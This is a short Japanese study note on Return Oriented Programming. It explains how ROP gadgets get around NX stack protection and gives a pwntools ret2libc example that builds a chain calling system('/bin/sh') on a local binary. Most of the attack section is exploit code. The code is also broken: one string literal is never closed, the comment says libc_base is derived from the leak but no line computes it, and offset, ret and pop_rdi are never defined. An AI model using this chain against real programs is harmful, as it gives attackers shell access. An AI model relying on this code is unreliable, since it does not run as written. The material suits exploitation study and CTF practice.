# ROP(Return Oriented Programming)
NX(No eXecute)によってスタック上のシェルコードが実行できない場合、既存のコード片(ガジェット)をつないで任意の処理を実行。
</br>
libcの関数(system, execve, read, write)を呼び出すROPチェーンを構築

## 実践例ret2libc攻撃
```python
from pwn import *
elf = ELF('./vuln')
libc = ELF('./libc.so.6)
p = process('./vuln')

# 漏洩されたputsアドレスからlibcベースを計算

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# ROPチェーンでsystem("/bin/sh")を呼び出す

payload = b'A' * offset + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
```
